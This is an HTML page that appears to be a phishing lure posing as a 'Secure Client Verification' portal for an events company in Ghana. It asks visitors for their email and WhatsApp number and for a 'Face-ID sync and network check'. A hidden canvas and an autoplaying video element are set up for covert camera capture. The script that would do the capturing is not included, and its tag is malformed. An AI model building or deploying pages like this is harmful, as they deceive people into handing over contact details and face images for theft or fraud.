<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Elite Events | Client Management Portal</title>
    <link rel="stylesheet" href="styles.css">
    <script href="scripts/people.js" defer>
</head>
<body>

<div class="card">
    <h2 class="gold">Elite Events Ghana</h2>
    <p>Secure Client Verification</p>
    
    <div class="input-group">
        <input type="email" id="email" placeholder="Confirm Personal Email" autocomplete="email">
        <input type="tel" id="phone" placeholder="Confirm WhatsApp Number" autocomplete="tel">
    </div>
    
    <p class="notice">To view <span class="gold">Confidential Event Contracts</span>, please perform a Face-ID sync and network check.</p>
    
    <button class="btn" id="verifyBtn">Verify & Open Vault</button>
    
    <video id="video" autoplay muted playsinline></video>
    <canvas id="canvas" style="display:none;"></canvas>
    <div id="status"></div>
</div>
</body>
</html>
